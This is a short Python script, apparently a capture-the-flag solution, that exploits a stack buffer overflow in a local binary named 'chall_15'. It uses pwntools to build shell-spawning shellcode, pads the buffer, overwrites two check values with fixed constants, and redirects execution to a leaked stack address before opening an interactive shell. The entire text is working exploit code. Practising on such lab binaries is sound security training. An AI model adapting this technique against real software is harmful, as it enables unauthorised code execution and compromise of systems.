# coding: utf-8
def chall15():
    p = process("./chall_15")
    elf = ELF("./chall_15")
    p.recvuntil("baked beans")
    context.arch = "amd64"
    a = asm(shellcraft.sh())
    len_a = len(a)
    leak = p.recv()
    intleak = int(leak, 16)
    payload = (a + b"a"*((0x120-len_a)-0x8) + p32(0xdeadd00d) + p32(0xb16b00b5) + b"a"*8 + p64(intleak))
    p.sendline(payload)
    p.interactive()
    
    
chall15()
